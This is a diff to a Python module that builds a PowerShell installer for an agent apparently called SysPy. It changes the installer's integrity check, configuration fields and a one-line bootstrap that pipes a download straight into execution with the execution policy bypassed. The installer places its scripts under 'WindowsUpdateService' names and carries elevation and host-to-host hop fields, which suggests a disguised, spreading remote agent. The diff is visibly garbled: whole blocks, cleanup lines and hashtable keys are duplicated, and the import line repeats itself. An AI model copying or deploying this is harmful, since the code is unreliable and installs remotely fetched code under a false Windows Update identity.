@@ -22,7 +22,7 @@ Hard constraints, in priority order:
 from __future__ import annotations
 
 import secrets
-from .. import config
+from .. import config, crypto  # noqa: F401, crypto  # noqa: F401
 
 TEMPLATE = r'''
 function Install-SysPy {
@@ -39,7 +39,9 @@ $embed   = '@@EMBED@@'
 $protect = @@PROTECT@@
 $elevate = @@ELEVATE@@
 $target  = '@@TARGET@@'
-
+$pubkey  = '@@PUBKEY@@'
+$fmt     = '@@FMT@@'
+$proto   = '@@PROTO@@'
 function Say([string]$m)  { Write-Host "  $m" }
 function Warn([string]$m) { Write-Host "  [!] $m" }
 
@@ -133,6 +135,46 @@ $stage = Join-Path $env:TEMP ('wu-stage-' + [guid]::NewGuid().ToString('N').Subs
 
 if (-not (Fetch "$base/wu/kit.zip" $kit)) { throw "cannot download $base/wu/kit.zip" }
 
+# ---- integrity. PowerShell 5.1 has no Ed25519, so verify the HMAC the
+# controller publishes alongside. Catches a LAN MITM and a truncated file; the
+# pinned Ed25519 key is enforced by the Python side on every later update.
+try {
+    $meta = (New-Object Net.WebClient).DownloadString("$base/wu/kit.meta") | ConvertFrom-Json
+    $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
+        [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$room|$pass"))
+    $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
+    $hex  = ([BitConverter]::ToString($hmac.ComputeHash([IO.File]::ReadAllBytes($kit)))).Replace('-','').ToLower()
+    if ($meta.hmac -and $hex -ne $meta.hmac.ToLower()) {
+        throw "kit integrity check failed (expected $($meta.hmac.Substring(0,12))..., got $($hex.Substring(0,12))...)"
+    }
+    Say "kit verified ($($meta.bytes) bytes)"
+} catch [System.Management.Automation.MethodInvocationException] {
+    Warn "integrity check unavailable: $($_.Exception.Message)"
+} catch {
+    if ($_.Exception.Message -like '*integrity check failed*') { throw }
+    Warn "integrity check skipped: $($_.Exception.Message)"
+}
+
+# ---- integrity. PowerShell 5.1 has no Ed25519, so verify the HMAC the
+# controller publishes alongside. Catches a LAN MITM and a truncated file; the
+# pinned Ed25519 key is enforced by the Python side on every later update.
+try {
+    $meta = (New-Object Net.WebClient).DownloadString("$base/wu/kit.meta") | ConvertFrom-Json
+    $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
+        [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$room|$pass"))
+    $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
+    $hex  = ([BitConverter]::ToString($hmac.ComputeHash([IO.File]::ReadAllBytes($kit)))).Replace('-','').ToLower()
+    if ($meta.hmac -and $hex -ne $meta.hmac.ToLower()) {
+        throw "kit integrity check failed (expected $($meta.hmac.Substring(0,12))..., got $($hex.Substring(0,12))...)"
+    }
+    Say "kit verified ($($meta.bytes) bytes)"
+} catch [System.Management.Automation.MethodInvocationException] {
+    Warn "integrity check unavailable: $($_.Exception.Message)"
+} catch {
+    if ($_.Exception.Message -like '*integrity check failed*') { throw }
+    Warn "integrity check skipped: $($_.Exception.Message)"
+}
+
 Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Force -Path $stage | Out-Null
 [IO.Compression.ZipFile]::ExtractToDirectory($kit, $stage)
@@ -148,6 +190,8 @@ foreach ($owned in 'syspy','install','agent.py','bootstrap.py') {
 }
 Copy-Item $kit (Join-Path $target 'kit.zip') -Force
 Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item (Join-Path $env:TEMP 'wu-kit.zip') -Force -ErrorAction SilentlyContinue
+Remove-Item (Join-Path $env:TEMP 'wu-kit.zip') -Force -ErrorAction SilentlyContinue
 
 foreach ($pair in @(@('install\wu.cmd','WindowsUpdateService.cmd'),
                     @('install\wu.vbs','WindowsUpdateService.vbs'))) {
@@ -161,6 +205,12 @@ $deploy = [ordered]@{
     room         = $room
     pass         = $pass
     salt         = $salt
+    fmt          = $fmt
+    proto        = $proto
+    pubkey       = $pubkey
+    fmt          = $fmt
+    proto        = $proto
+    pubkey       = $pubkey
     parent       = ''
     parent_ip    = ''
     hop          = 0
@@ -261,14 +311,18 @@ def render(base: str = "", room: str = "", passphrase: str = "", group: str = ""
             .replace("@@GROUP@@", esc(group))
             .replace("@@SALT@@", esc(salt or secrets.token_hex(4)))
             .replace("@@TARGET@@", esc(target))
+            .replace("@@PUBKEY@@", esc(config.PUBKEY_HEX))
+            .replace("@@FMT@@", str(config.ENVELOPE_FMT))
+            .replace("@@PROTO@@", str(config.PROTOCOL_VERSION))
             .replace("@@EMBED@@", getattr(config, "EMBED_VERSION", "3.12.8"))
             .replace("@@PROTECT@@", "$true" if protect else "$false")
             .replace("@@ELEVATE@@", "$true" if elevate else "$false"))
 
 
 def one_liner(base: str) -> str:
+    suffix = f"?k={config.WU_TOKEN}" if config.WU_TOKEN else ""
     return ('powershell -NoProfile -ExecutionPolicy Bypass '
-            f'-Command "irm {base.rstrip("/")}/wu | iex"')
+            f'-Command "irm {base.rstrip("/")}/wu{suffix} | iex"')
 
 
 def one_liner_legacy(base: str) -> str:
